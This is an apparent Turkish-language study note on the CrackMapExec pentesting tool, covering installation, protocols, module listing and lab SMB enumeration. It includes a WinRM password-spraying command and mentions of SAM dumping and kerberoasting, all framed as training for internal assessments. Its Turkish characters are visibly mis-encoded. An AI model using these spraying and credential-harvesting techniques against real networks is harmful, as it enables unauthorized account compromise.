---
{"dg-publish":true,"permalink":"/active-directory-expert/using-crack-map-exec/"}
---


### What is CrackMapExec?

CrackMapExec (diÄŸer adÄ±yla CME), Windows workstation ve sunucularÄ±ndan oluÅŸan bÃ¼yÃ¼k aÄŸlarÄ±n gÃ¼venliÄŸini deÄŸerlendirmeye yardÄ±mcÄ± olan bir araÃ§tÄ±r.

![Pasted image 20250215115520.png](/img/user/resimler/Pasted%20image%2020250215115520.png)

CME, aÄŸ protokolleriyle Ã§alÄ±ÅŸmak ve Ã§eÅŸitli exploit sonrasÄ± teknikleri gerÃ§ekleÅŸtirmek iÃ§in yoÄŸun olarak Impacket kÃ¼tÃ¼phanesini kullanÄ±r. CME'nin gÃ¼cÃ¼nÃ¼ anlamak iÃ§in basit senaryolar hayal etmemiz gerekir:

1. 1.000'den fazla **Windows workstation** ve **server** Ã¼zerinde bir **internal security assessment** yÃ¼rÃ¼tÃ¼yoruz. Sahip olduÄŸumuz **single set of credentials** ile herhangi bir makinede **local administrator** eriÅŸimimiz olup olmadÄ±ÄŸÄ±nÄ± nasÄ±l test ederiz?
2. Elimizde yalnÄ±zca bir **target** ve birden fazla **set of credentials** var, ancak bunlarÄ±n hÃ¢lÃ¢ geÃ§erli olup olmadÄ±ÄŸÄ±nÄ± Ã¶ÄŸrenmemiz gerekiyor. BunlarÄ± hÄ±zlÄ±ca nasÄ±l test edebiliriz?
3. **Local administrator credentials** elde ettik ve her ele geÃ§irilmiÅŸ **workstation** Ã¼zerindeki **SAM file**'Ä± hÄ±zlÄ±ca **dump** etmek istiyoruz. Bunun iÃ§in baÅŸka bir **tool** mÃ¼ kullanmalÄ±yÄ±z, yoksa her **workstation** Ã¼zerinde manuel olarak mÄ± iÅŸlem yapmalÄ±yÄ±z?


Bu sorular birÃ§ok **tool** ve teknik kullanÄ±larak cevaplanabilir, ancak farklÄ± yazarlar tarafÄ±ndan geliÅŸtirilen birden fazla **tool** ile Ã§alÄ±ÅŸmak faydalÄ± olabilir. Ä°ÅŸte burada [**CrackMapExec (CME)**](https://github.com/Porchetta-Industries/CrackMapExec) devreye girer ve **internal penetration test** sÄ±rasÄ±nda ihtiyacÄ±mÄ±z olan kÃ¼Ã§Ã¼k iÅŸlemleri **automate** etmemize yardÄ±mcÄ± olur. **CME**, ayrÄ±ca **security assessment** sÄ±rasÄ±nda bulduÄŸumuz **credentials**'larÄ± bir **database** iÃ§inde toplar, bÃ¶ylece gerektiÄŸinde bunlara geri dÃ¶nebiliriz. **Output**, **intuitive** ve **straightforward** olup **tool**, **Linux** ve **Windows** Ã¼zerinde Ã§alÄ±ÅŸÄ±r, ayrÄ±ca **socks proxy** ve birden fazla **protocol** desteÄŸine sahiptir.

AsÄ±l olarak **offensive purposes** (Ã¶rn. **internal pentesting**) iÃ§in kullanÄ±lmak Ã¼zere tasarlanmÄ±ÅŸ olsa da, **CME**; **blue team** tarafÄ±ndan **account privileges**'Ä± deÄŸerlendirmek, olasÄ± **misconfigurations**'larÄ± bulmak ve **attack scenarios**'larÄ±nÄ± simÃ¼le etmek iÃ§in de kullanÄ±labilir.

Haziran 2021'den beri **CrackMapExec**, yalnÄ±zca **[Porchetta](https://porchetta.industries/) platformu** Ã¼zerinde gÃ¼ncellenmekte ve **public repository** Ã¼zerinde gÃ¼ncellenmemektedir. **Sponsorship**, **[Porchetta](https://porchetta.industries/)** Ã¼zerindeki tÃ¼m araÃ§lara **altÄ± (6) ay** boyunca eriÅŸim saÄŸlamak iÃ§in **$60** tutarÄ±ndadÄ±r. **Private repository**, her **altÄ± (6) ayda bir** **public repository** ile birleÅŸtirilir. Ancak, **community contributions**, herkese anÄ±nda sunulmaktadÄ±r. **CrackMapExec**, [**@byt3bl33d3r**](https://twitter.com/byt3bl33d3r) ve [**@mpgn**](https://twitter.com/mpgn_x64) tarafÄ±ndan geliÅŸtirilmektedir. **Official documentation**, [**CrackMapExec Wiki**](https://wiki.porchetta.industries/) Ã¼zerinde bulunabilir.

Haziran 2023'te, **mpgn**, **CrackMapExec**'in **lead developer**'Ä± olarak, **CrackMapExec**'in en son sÃ¼rÃ¼mÃ¼ olan **versiyon 6**'yÄ± iÃ§eren yeni bir **repository** oluÅŸturdu, ancak daha sonra bu **repository** kaldÄ±rÄ±ldÄ±.

Bu araca katkÄ±da bulunan bazÄ± geliÅŸtiriciler, projeyi devam ettirmek iÃ§in bir **fork** oluÅŸturmaya karar verdi. Proje, **NetExec** olarak yeniden adlandÄ±rÄ±ldÄ± ve ÅŸu adreste bulunmaktadÄ±r:  
ğŸ”— **[https://github.com/Pennyw0rth/NetExec](https://github.com/Pennyw0rth/NetExec)**

**Not:** Bu modÃ¼lde **CrackMapExec 5.4** sÃ¼rÃ¼mÃ¼nÃ¼ kullanÄ±yor olsak da, en son gÃ¼ncellemelerle Ã§alÄ±ÅŸmak iÃ§in bu yeni **repository**'yi kullanabiliriz:  
ğŸ”— **[https://github.com/Pennyw0rth/NetExec](https://github.com/Pennyw0rth/NetExec)**

Åimdi, **CME** aracÄ±na genel bir bakÄ±ÅŸ sunduÄŸumuza gÃ¶re, detaylara girmeden Ã¶nce onu tercih ettiÄŸimiz **penetration testing system** Ã¼zerinde nasÄ±l kuracaÄŸÄ±mÄ±zÄ± ele alalÄ±m.



## Installation & Binaries

**CrackMapExec**, **Linux**, **Windows** ve **macOS** ile uyumludur ve ayrÄ±ca **Docker** kullanÄ±larak da kurulabilir. Kurulum gerektirmeyen baÄŸÄ±msÄ±z **binary** dosyalarÄ± da mevcuttur.

Åimdi, **CrackMapExec**'i nasÄ±l kurabileceÄŸimizi inceleyelim.



### Linux Installation

**CrackMapExec** geliÅŸtiricileri, baÄŸÄ±mlÄ±lÄ±k ve paket yÃ¶netimi iÃ§in **[Poetry](https://python-poetry.org/docs/)** kullanmayÄ± Ã¶nermektedir. **Poetry**, **Python** projelerinde baÄŸÄ±mlÄ±lÄ±k yÃ¶netimi ve paketleme iÃ§in kullanÄ±lan bir araÃ§tÄ±r. Projenizin ihtiyaÃ§ duyduÄŸu **kÃ¼tÃ¼phaneleri** tanÄ±mlamanÄ±za olanak tanÄ±r ve bunlarÄ± **yÃ¼kleyip/gÃ¼ncelleyerek** yÃ¶netir.

Åimdi, **Poetry**'yi kurmak iÃ§in [resmi kurulum kÄ±lavuzunu](https://python-poetry.org/docs/#installing-with-the-official-installer) takip edelim:


#### Installing Poetry

```
curl -SSL https://install.python-poetry.org | python3 -

Retrieving Poetry metadata
# Welcome to Poetry!
This will download and install the latest version of Poetry,
a dependency and package manager for Python.
It will add the `poetry` command to Poetry's bin directory, located at:
/home/htb-ac35990/.local/bin
You can uninstall at any time by executing this script with the --
uninstall option, and these changes will be reverted.
Installing Poetry (1.2.2): Done
Poetry (1.2.2) is installed now. Great!
You can test that everything is set up by executing the following:
`poetry --version`

```

Sonraki adÄ±mda, gerekli **kÃ¼tÃ¼phaneleri** yÃ¼klememiz ve **CrackMapExec** deposunu **klonlamamÄ±z** gerekiyor. AyrÄ±ca, **RDP protokolÃ¼** desteÄŸi iÃ§in artÄ±k gerekli olan **Rust**'Ä± da yÃ¼klememiz gerekecek.


#### Installing CrackMapExec Required Libraries

```
sudo apt-get update

sudo apt-get install -y libssl-dev libkrb5-dev libffi-dev python-dev build-essential

<SNIP>

```

CrackMapExec, RDP protokolÃ¼ iÃ§in Rust kullanan bir kÃ¼tÃ¼phaneye ihtiyaÃ§ duyar. Rust'Ä± kurmak iÃ§in ÅŸu komutu kullanacaÄŸÄ±z. EÄŸer bir uyarÄ± alÄ±rsak, `y` yazmamÄ±z ve `1.` seÃ§eneÄŸi seÃ§memiz gerekir:


#### Installing Rust

```
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs/ | sh

info: downloading installer
warning: it looks like you have an existing installation of Rust at:
warning: /usr/bin
warning: rustup should not be installed alongside Rust. Please uninstall
your existing Rust first.
warning: Otherwise you may have confusion unless you are careful with your
PATH
warning: If you are sure that you want both rustup and your already
installed Rust
warning: then please reply `y' or `yes' or set RUSTUP_INIT_SKIP_PATH_CHECK
to yes
warning: or pass `-y' to ignore all ignorable checks.
error: cannot install while Rust is installed

Continue? (y/N) y

<SNIP>
Current installation options:
 default host triple: x86_64-unknown-linux-gnu
 default toolchain: stable (default)
 profile: default
 modify PATH variable: yes
1) Proceed with installation (default)
2) Customize installation
3) Cancel installation
>1
<SNIP>

```

Sonraki adÄ±mda, terminali kapatmalÄ±yÄ±z; aksi takdirde RDP kÃ¼tÃ¼phanesi aardwolf'u kurarken bir hata alÄ±rÄ±z. Terminali kapattÄ±ktan sonra, yeni bir terminal aÃ§Ä±p kuruluma devam etmeliyiz.


#### Installing CrackMapExec with Poetry

```
git clone https://github.com/Porchetta-Industries/CrackMapExec
cd CrackMapExec
poetry install

poetry install

Installing dependencies from lock file
Package operations: 94 installs, 0 updates, 0 removals
 â€¢ Installing asn1crypto (1.5.1)
 â€¢ Installing asysocks (0.2.1)
 â€¢ Installing oscrypto (1.3.0)
<SNIP>

```


Åimdi, yeni kurduÄŸumuz CrackMapExec aracÄ±nÄ± aÅŸaÄŸÄ±daki komutla test edebiliriz:

```
poetry run crackmapexec .
```


#### Running CrackMapExec with Poetry

```
poetry run crackmapexec
poetry run crackmapexec
usage: crackmapexec [-h] [-t THREADS] [--timeout TIMEOUT] [--jitter
INTERVAL] [--darrell] [--verbose] {ftp,ssh,winrm,mssql,rdp,ldap,smb} ...
 ______ .______ ___ ______ __ ___ .___ ___.
___ .______ _______ ___ ___ _______ ______
 / || _ \ / \ / || |/ / | \/ | /
\ | _ \ | ____|\ \ / / | ____| / |
 | ,----'| |_) | / ^ \ | ,----'| ' / | \ / | /
^ \ | |_) | | |__ \ V / | |__ | ,----'
 | | | / / /_\ \ | | | < | |\/| | /
/_\ \ | ___/ | __| > < | __| | |
 | `----.| |\ \----. / _____ \ | `----.| . \ | | | | /
_____ \ | | | |____ / . \ | |____ | `----.
 \______|| _| `._____|/__/ \__\ \______||__|\__\ |__| |__| /__/
\__\ | _| |_______|/__/ \__\ |_______| \______|
 A swiss army knife for
pentesting networks
 Forged by @byt3bl33d3r and @mpgn_x64
using the powah of dank memes
 Exclusive release for Porchetta
Industries users

https://porchetta.industries/
 Version : 5.4.0
 Codename:
Indestructible G0thm0g
optional arguments:
 -h, --help show this help message and exit
 -t THREADS set how many concurrent threads to use (default:
100)
 --timeout TIMEOUT max timeout in seconds of each thread (default:
None)
 --jitter INTERVAL sets a random delay between each connection
(default: None)
 --Darrell give Darrell a hand
 --verbose enable verbose output
protocols:
 available protocols
 {ftp,ssh,winrm,mssql,rdp,LDAP,smb}
 ftp own stuff using FTP
 ssh own stuff using SSH
 winrm own stuff using WINRM
 mssql own stuff using MSSQL
 rdp own stuff using RDP
 ldap own stuff using LDAP
 smb own stuff using SMB
```


Not: CrackMapExec repository'si gÃ¼ncellenirse ve indirdiÄŸimiz kopyayÄ± Git clone ile gÃ¼ncellemek istersek, CrackMapExec dizinine gidip online repository'den en son deÄŸiÅŸiklikleri indirmek iÃ§in `git pull` komutunu kullanabiliriz. EÄŸer `poetry run` komutunu kullanmadan Ã¶nce crackmapexec'i Ã§alÄ±ÅŸtÄ±rmak istiyorsak, Poetry virtual environment'Ä±nÄ± etkinleÅŸtirmek iÃ§in kurulum dizininde `poetry shell` komutunu Ã§alÄ±ÅŸtÄ±rabiliriz.


### Using Poetry Shell

```
cd CrackMapExec
poetry shell

Spawning shell within /home/htbXXXXXXX/.cache/pypoetry/virtualenvs/crackmapexec-4YDbTJlJ-py3.9

(crackmapexec-py3.9) crackmapexec --help
usage: crackmapexec [-h] [-t THREADS] [--timeout TIMEOUT] [--jitter
INTERVAL] [--darrell] [--verbose] {ftp,ldap,mssql,rdp,smb,ssh,winrm} ...
<SNIP>

```

Not: Poetry shell'de olduÄŸumuzu, terminalimizin baÅŸÄ±nda (`crackmapexec-py3.X`) gÃ¶rdÃ¼ÄŸÃ¼mÃ¼zde anlayabiliriz. Virtual environment'Ä± devre dÄ±ÅŸÄ± bÄ±rakmak ve bu yeni shell'den Ã§Ä±kmak iÃ§in `exit` yazabiliriz. Virtual environment'Ä± shell'den Ã§Ä±kmadan devre dÄ±ÅŸÄ± bÄ±rakmak iÃ§in ise `deactivate` komutunu kullanabiliriz.


## Installation for Docker

CrackMapExec, Docker uyumlu bir araÃ§tÄ±r. GitHub repository'sindeki Dockerfile'Ä± kullanarak kaynaktan derleyebiliriz.


### Installing Docker using the GitHub repository

```
sudo apt install docker.io
git clone https://github.com/Porchetta-Industries/CrackMapExec -q
cd CrackMapExec
sudo docker build -t crackmapexec .
sudo docker build -t crackmapexec .

Sending build context to Docker daemon 10.38MB
<SNIP>
```


```
sudo docker run -it --entrypoint=/bin/bash --name crackmapexec -v ~/.cme:/root/.cme crackmapexec
root@d46e1e7925dc:/usr/src/crackmapexec/cme# crackmapexec

[*] Creating default workspace
[*] Initializing LDAP protocol database
[*] Initializing MSSQL protocol database
[*] Initializing RDP protocol database
[*] Initializing SMB protocol database
[*] Initializing SSH protocol database
[*] Initializing WINRM protocol database
[*] Copying default configuration file
[*] Generating SSL certificate
usage: crackmapexec [-h] [-t THREADS] [--timeout TIMEOUT] [--jitter
INTERVAL] [--darrell] [--verbose] {ftp,ssh,winrm,mssql,rdp,LDAP,smb} ...
 ______ .______ ___ ______ __ ___ .___ ___.
___ .______ _______ ___ ___ _______ ______
 / || _ \ / \ / || |/ / | \/ | /
\ | _ \ | ____|\ \ / / | ____| / |
 | ,----'| |_) | / ^ \ | ,----'| ' / | \ / | /
^ \ | |_) | | |__ \ V / | |__ | ,----'
 | | | / / /_\ \ | | | < | |\/| | /
/_\ \ | ___/ | __| > < | __| | |
 | `----.| |\ \----. / _____ \ | `----.| . \ | | | | /
_____ \ | | | |____ / . \ | |____ | `----.
 \______|| _| `._____|/__/ \__\ \______||__|\__\ |__| |__| /__/
\__\ | _| |_______|/__/ \__\ |_______| \______|
 A swiss army knife for
pentesting networks
 Forged by @byt3bl33d3r and @mpgn_x64
using the powah of dank memes
 Exclusive release for Porchetta
Industries users

https://porchetta.industries/
 Version : 5.4.0
 Codename:
Indestructible G0thm0g
<SNIP>

```


Container'dan Ã§Ä±ktÄ±ktan sonra, aÅŸaÄŸÄ±daki komutla yeniden baÅŸlatabiliriz:

### Restart Container

```
sudo docker start crackmapexec
sudo docker exec -it crackmapexec bash
root@dbbda0e6bf72:/usr/src/crackmapexec#
```

Not: Docker repository'si ve yayÄ±nlanan binary'ler gÃ¼ncel olmayabilir. Kaynaktan derleme yapmak, en son mevcut sÃ¼rÃ¼mÃ¼ kullandÄ±ÄŸÄ±mÄ±zÄ± garanti eder.


### Using Binaries

CrackMapExec'i, Ã¶nceden derlenmiÅŸ ve CrackMapExec GitHub repository'sinde [releases](https://github.com/byt3bl33d3r/CrackMapExec/releases) altÄ±nda mevcut olan binary'lerle de kullanabiliriz. 

Repository'de iki ana dosya bulacaÄŸÄ±z: biri cme ile baÅŸlayanlar, diÄŸeri ise cmedb ile baÅŸlayanlar. cme, CrackMapExec uygulamasÄ±na karÅŸÄ±lÄ±k gelirken, cmedb, CrackMapExec veritabanÄ±yla etkileÅŸimde bulunmamÄ±zÄ± saÄŸlayan binary'ye karÅŸÄ±lÄ±k gelir.  
Bir binary kullanmak istiyorsak, bunu releases bÃ¶lÃ¼mÃ¼nden indirmemiz ve Python'un yÃ¼klÃ¼ olmasÄ± gerekir. EÄŸer Windows Ã¼zerinde Ã§alÄ±ÅŸÄ±yorsak ve Python yÃ¼klÃ¼ deÄŸilse, [burada](https://www.python.org/downloads/windows/) mevcut olan Python Windows embeddable paketini indirebiliriz, ardÄ±ndan aÅŸaÄŸÄ±daki komutu Ã§alÄ±ÅŸtÄ±rabiliriz:


### Compiled Binaries Windows

```
C:\htb> python.exe cme
<SNIP>
```


Not: Binary'ler Windows, Linux ve MacOS Ã¼zerinde de kullanÄ±labilir.  

Windows'ta, yol uzunluÄŸu ile ilgili hatalardan kaÃ§Ä±nmak iÃ§in aÅŸaÄŸÄ±daki Registry key'ini ekleyin:


### Setting Long Path Registry Key

```
C:\> reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem" /v LongPathsEnabled /t REG_DWORD /d 1 /f
```

Not: CrackMapExec loglarÄ±nÄ± ve database'ini `~/.cme` dizinine kaydeder.

AÅŸaÄŸÄ±daki bÃ¶lÃ¼mlerde, CrackMapExec iÅŸlevlerini kullanarak Windows ortamlarÄ±nÄ± enumere edecek ve saldÄ±rÄ±ya geÃ§eceÄŸiz.


## Targets and Protocols

### Targets Format

Scope'a baÄŸlÄ± olarak, bir engagement sÄ±rasÄ±nda belirli bir aralÄ±ktaki bir veya daha fazla hedefi veya Ã¶nceden tanÄ±mlanmÄ±ÅŸ host adlarÄ±nÄ± tarayabiliriz. CrackMapExec bunu mÃ¼kemmel bir ÅŸekilde yÃ¶netebilir. Hedef, bir [CIDR](https://en.wikipedia.org/wiki/Classless_Inter-Domain_Routing), bir IP, bir host adÄ± veya IP adreslerini/host adlarÄ±nÄ± iÃ§eren bir dosya adÄ± olabilir.

```
crackmapexec [protocol] 10.10.10.1
crackmapexec [protocol] 10.10.10.1 10.10.10.2 10.10.10.3
crackmapexec [protocol] 10.10.10.1/24
crackmapexec [protocol] internal.local
crackmapexec [protocol] targets.txt
```


### Supported Protocols

CrackMapExec, bir internal security deÄŸerlendirmesi sÄ±rasÄ±nda bize yardÄ±mcÄ± olmak iÃ§in tasarlanmÄ±ÅŸtÄ±r. Bu nedenle, Windows ile baÄŸlantÄ±lÄ± birden fazla protokolÃ¼ desteklemesi gerekir. Bu modÃ¼l yazÄ±ldÄ±ÄŸÄ± sÄ±rada, CrackMapExec yedi protokolÃ¼ desteklemektedir:

| Protocol | Default Port |
| -------- | ------------ |
| SMB      | 445          |
| WINRM    | 5985/5986    |
| MSSQL    | 1433         |
| LDAP     | 389          |
| SSH      | 22           |
| RDP      | 3389         |
| FTP      | 21           |

Mevcut protokolleri doÄŸrulamak iÃ§in, mevcut seÃ§enekleri ve protokolleri listelemek iÃ§in `crackmapexec --help` komutunu Ã§alÄ±ÅŸtÄ±rabiliriz.


### Genel SeÃ§enekleri ve Protokolleri Listele

```
crackmapexec --help

usage: crackmapexec [-h] [-t THREADS] [--timeout TIMEOUT] [--jitter
INTERVAL] [--darrell] [--verbose] {ftp,ssh,winrm,mssql,rdp,ldap,smb} ...
 ______ .______ ___ ______ __ ___ .___ ___.
___ .______ _______ ___ ___ _______ ______
 / || _ \ / \ / || |/ / | \/ | /
\ | _ \ | ____|\ \ / / | ____| / |
 | ,----'| |_) | / ^ \ | ,----'| ' / | \ / | /
^ \ | |_) | | |__ \ V / | |__ | ,----'
 | | | / / /_\ \ | | | < | |\/| | /
/_\ \ | ___/ | __| > < | __| | |
 | `----.| |\ \----. / _____ \ | `----.| . \ | | | | /
_____ \ | | | |____ / . \ | |____ | `----.
 \______|| _| `._____|/__/ \__\ \______||__|\__\ |__| |__| /__/
\__\ | _| |_______|/__/ \__\ |_______| \______|
 A swiss army knife for
pentesting networks
 Forged by @byt3bl33d3r and @mpgn_x64
using the powah of dank memes
 Exclusive release for Porchetta
Industries users

https://porchetta.industries/
 Version : 5.4.0
 Codename:
Indestructible G0thm0g
optional arguments:
 -h, --help show this help message and exit
 -t THREADS set how many concurrent threads to use (default:
100)
 --timeout TIMEOUT max timeout in seconds of each thread (default:
None)
 --jitter INTERVAL sets a random delay between each connection
(default: None)
 --darrell give Darrell a hand
 --verbose enable verbose output
protocols:
 available protocols
 {ftp,ssh,winrm,mssql,rdp,ldap,smb}
 ftp own stuff using FTP
 ssh own stuff using SSH
 winrm own stuff using WINRM
 mssql own stuff using MSSQL
 rdp own stuff using RDP
 ldap own stuff using LDAP
 smb own stuff using SMB

```


Belirli bir protokolÃ¼n desteklediÄŸi seÃ§enekleri gÃ¶rmek iÃ§in `crackmapexec <protocol> --help` komutunu Ã§alÄ±ÅŸtÄ±rabiliriz. LDAP'Ä± Ã¶rnek olarak gÃ¶relim:


### LDAP ProtokolÃ¼ ile KullanÄ±labilen SeÃ§enekleri GÃ¶rÃ¼ntÃ¼lem

```
crackmapexec ldap --help

usage: crackmapexec ldap [-h] [-id CRED_ID [CRED_ID ...]]
 [-u USERNAME [USERNAME ...]]
 [-p PASSWORD [PASSWORD ...]] [-k]
 [--export EXPORT [EXPORT ...]]
 [--aesKey AESKEY [AESKEY ...]] [--kdcHost
KDCHOST]
 [--gfail-limit LIMIT | --ufail-limit LIMIT | --
fail-limit LIMIT]
 [-M MODULE] [-o MODULE_OPTION [MODULE_OPTION
...]]
 [-L] [--options] [--server {http,https}]
 [--server-host HOST] [--server-port PORT]
 [--connectback-host CHOST] [-H HASH [HASH ...]]
 [--no-bruteforce] [--continue-on-success]
 [--port {636,389}] [--no-smb]
 [-d DOMAIN | --local-auth] [--asreproast
ASREPROAST]
 [--kerberoasting KERBEROASTING]
[--trusted-for-delegation] [--password-notrequired]
 [--admin-count] [--users] [--groups]
 [target ...]
positional arguments:
 target the target IP(s), range(s), CIDR(s), hostname(s),
 FQDN(s), file(s) containing a list of targets,
NMap
 XML or .Nessus file(s)
optional arguments:
 -h, --help show this help message and exit
 -id CRED_ID [CRED_ID ...]
 database credential ID(s) to use for
authentication
 -u USERNAME [USERNAME ...]
 username(s) or file(s) containing usernames
 -p PASSWORD [PASSWORD ...]
 password(s) or file(s) containing passwords
 -k, --kerberos Use Kerberos authentication from ccache file
 (KRB5CCNAME)
 --export EXPORT [EXPORT ...]
 Export result into a file, probably buggy
 --aesKey AESKEY [AESKEY ...]
 AES key to use for Kerberos Authentication (128 or
256
 bits)
 --kdcHost KDCHOST FQDN of the domain controller. If omitted it will
use
 the domain part (FQDN) specified in the target
 parameter
 --gfail-limit LIMIT max number of global failed login attempts
 --ufail-limit LIMIT max number of failed login attempts per username
 --fail-limit LIMIT max number of failed login attempts per host
 -M MODULE, --module MODULE
 module to use
 -o MODULE_OPTION [MODULE_OPTION ...]
 module options
 -L, --list-modules list available modules
 --options display module options
 --server {http,https}
 use the selected server (default: https)
 --server-host HOST IP to bind the server to (default: 0.0.0.0)
 --server-port PORT start the server on the specified port
 --connectback-host CHOST
 IP for the remote system to connect back to (default:
 same as server-host)
 -H HASH [HASH ...], --hash HASH [HASH ...]
 NTLM hash(es) or file(s) containing NTLM hashes
 --no-bruteforce No spray when using file for username and password
 (user1 => password1, user2 => password2
 --continue-on-success
 continues authentication attempts even after
successes
 --port {636,389} LDAP port (default: 389)
 --no-smb No smb connection
 -d DOMAIN domain to authenticate to
 --local-auth authenticate locally to each target
Retrevie hash on the remote DC:
 Options to get hashes from Kerberos
 --asreproast ASREPROAST
 Get AS_REP response ready to crack with hashcat
 --kerberoasting KERBEROASTING
 Get TGS ticket ready to crack with hashcat
Retrieve useful information on the domain:
 Options to to play with Kerberos
 --trusted-for-delegation
 Get the list of users and computers with flag
TRUSTED_FOR_DELEGATION
 --password-not-required
 Get the list of users with flag PASSWD_NOTREQD
 --admin-count Get objets that had the value adminCount=1
 --users Enumerate enabled domain users
 --groups Enumerate domain groups

```



### Hedef SeÃ§me ve Protokol Kullanma

Desteklenen birkaÃ§ protokol ve her biri iÃ§in Ã§eÅŸitli seÃ§eneklerle, CrackMapExec'te ustalaÅŸmanÄ±n zor olacaÄŸÄ±nÄ± dÃ¼ÅŸÃ¼nebiliriz. Neyse ki, bir protokol iÃ§in nasÄ±l Ã§alÄ±ÅŸtÄ±ÄŸÄ±nÄ± anladÄ±ÄŸÄ±mÄ±zda, aynÄ± mantÄ±k diÄŸer protokoller iÃ§in de geÃ§erlidir. Ã–rneÄŸin, password spraying tÃ¼m protokoller iÃ§in aynÄ±dÄ±r:


### Password Spray Example with WinRm

```
crackmapexec winrm 10.10.10.1 -u users.txt -p password.txt --no-bruteforce --continue-on-success
```

BaÅŸka bir protokole karÅŸÄ± password spraying saldÄ±rÄ±sÄ± gerÃ§ekleÅŸtirmek istiyorsak, protokolÃ¼ deÄŸiÅŸtirmemiz gerekir:

- **`--no-bruteforce`**
    
    - Bu parametre, **bruteforce denemelerini** devre dÄ±ÅŸÄ± bÄ±rakÄ±r. EÄŸer bu parametre kullanÄ±lÄ±rsa, sadece kullanÄ±cÄ± adÄ± ve ÅŸifrenin doÄŸru eÅŸleÅŸtiÄŸi durumlar kontrol edilir. Yani, ÅŸifre denemeleri yapmadan doÄŸrudan kullanÄ±cÄ±nÄ±n geÃ§erli olup olmadÄ±ÄŸÄ± kontrol edilir. EÄŸer bu parametre kullanÄ±lmasaydÄ±, her kullanÄ±cÄ± ve ÅŸifre kombinasyonu denenecekti.

- **`--continue-on-success`**
    
    - Bu parametre, **baÅŸarÄ± durumunda iÅŸlemi durdurmamayÄ±** saÄŸlar. EÄŸer doÄŸru bir kullanÄ±cÄ± adÄ± ve ÅŸifre kombinasyonu bulunursa, iÅŸlem durmaz ve diÄŸer kullanÄ±cÄ±lar ve ÅŸifreler iÃ§in de denemelere devam edilir. Bu, hedefte daha fazla kullanÄ±cÄ± hesabÄ± veya farklÄ± ÅŸifreler denemek iÃ§in kullanÄ±lÄ±r.

### Target Protocols

```
crackmapexec smb 10.10.10.1 [protocol options]
crackmapexec mssql 10.10.10.1 [protocol options]
crackmapexec ldap 10.10.10.1 [protocol options]
crackmapexec ssh 10.10.10.1 [protocol options]
crackmapexec rdp 10.10.10.1 [protocol options]
crackmapexec ftp 10.10.10.1 [protocol options]
```

Bu basit kuralÄ± anladÄ±ÄŸÄ±mÄ±zda, CrackMapExec'in gÃ¼cÃ¼nÃ¼n, sunulan tÃ¼m seÃ§eneklerle ilgili kullanÄ±m kolaylÄ±ÄŸÄ±ndan kaynaklandÄ±ÄŸÄ±nÄ± gÃ¶receÄŸiz.


### Export Function

CrackMapExec bir export fonksiyonu ile birlikte gelir, ancak yardÄ±m menÃ¼sÃ¼nde gÃ¶sterildiÄŸi gibi hatalÄ±dÄ±r. DÄ±ÅŸa aktarÄ±lacak dosyanÄ±n tam yolunu gerektirir:

#### Exporting result CME
 
```
crackmapexec smb 10.10.10.1 [protocol options] --export $(pwd)/export.txt
```

Bir sonraki bÃ¶lÃ¼mde, bazÄ± export Ã¶rneklerini tartÄ±ÅŸacaÄŸÄ±z.


### Protocol Modules

CrackMapExec, daha sonra kullanacaÄŸÄ±mÄ±z ve tartÄ±ÅŸacaÄŸÄ±mÄ±z modÃ¼lleri destekler. Her protokolÃ¼n farklÄ± modÃ¼lleri vardÄ±r. Belirtilen protokol iÃ§in mevcut modÃ¼lleri gÃ¶rÃ¼ntÃ¼lemek iÃ§in `crackmapexec protocol -L` komutunu Ã§alÄ±ÅŸtÄ±rabiliriz.

**Protokol TabanlÄ± Listeleme:** Hangi servislerin aÃ§Ä±k olduÄŸuna dair bilgi verir.


#### LDAP iÃ§in Mevcut ModÃ¼lleri GÃ¶rÃ¼ntÃ¼le

```
crackmapexec ldap -L

[*] MAQ Retrieves the MachineAccountQuota domainlevel attribute
[*] adcs Find PKI Enrollment Services in Active
Directory and Certificate Templates Names
[*] daclread Read and backup the Discretionary Access
Control List of objects. Based on the work of @_nwodtuhs and @BlWasp_. Be
carefull, this module cannot read the DACLS recursively, more explains in
the options.
[*] get-desc-users Get description of the users. May contained
password
[*] get-network
[*] laps Retrieves the LAPS passwords
[*] ldap-checker Checks whether LDAP signing and binding are
required and / or enforced
[*] ldap-signing Check whether LDAP signing is required
[*] subnets Retrieves the different Sites and Subnets of
an Active Directory
[*] user-desc Get user descriptions stored in Active
Directory
[*] whoami Get details of provided user

```



## Basic SMB Reconnaissance

SMB protokolÃ¼, bir Windows hedefi Ã¼zerinde keÅŸif yapmak iÃ§in avantajlÄ±dÄ±r. Herhangi bir kimlik doÄŸrulamasÄ± olmadan, aÅŸaÄŸÄ±daki gibi her tÃ¼rlÃ¼ bilgiyi alabiliriz:

| IP address                  | Target local name      |
| --------------------------- | ---------------------- |
| Windows version             | Architecture (x86/x64) |
| Fully qualified domain name | SMB signing enabled    |
| SMB version                 |                        |

### SMB Enumeration

```
crackmapexec smb 192.168.133.0/24

SMB 192.168.133.1 445 DESKTOP-DKCQVG2 [*] Windows 10.0 Build
19041 x64 (name:DESKTOP-DKCQVG2) (domain:DESKTOP-DKCQVG2) (signing:False)
(SMBv1:False)

SMB 192.168.133.158 445 WIN-TOE6NQTR989 [*] Windows Server
2016 Datacenter 14393 x64 (name:WIN-TOE6NQTR989)
(domain:inlanefreight.htb) (signing:True) (SMBv1:True)

SMB 192.168.133.157 445 WIN7 [*] Windows 7 Ultimate
7601 Service Pack 1 x64 (name:WIN7) (domain:WIN7) (signing:False)
(SMBv1:True)
```

Bu basit komutla, tarama anÄ±nda laboratuvarÄ±mÄ±zdaki tÃ¼m canlÄ± hedefleri, domain adÄ±, iÅŸletim sistemi sÃ¼rÃ¼mÃ¼ vb. ile birlikte alabiliriz. Ã‡Ä±ktÄ±da gÃ¶rdÃ¼ÄŸÃ¼mÃ¼z gibi, hedef `192.168.133.157`'nin `domain parametresi`, name parametresiyle aynÄ±, yani hedef WIN7, `inlanefreight.htb` domain'ine katÄ±lmamÄ±ÅŸ. Buna karÅŸÄ±n, `WIN-TOE6NQTR989` hedefi `inlanefreight.htb` domain'ine katÄ±lmÄ±ÅŸ.


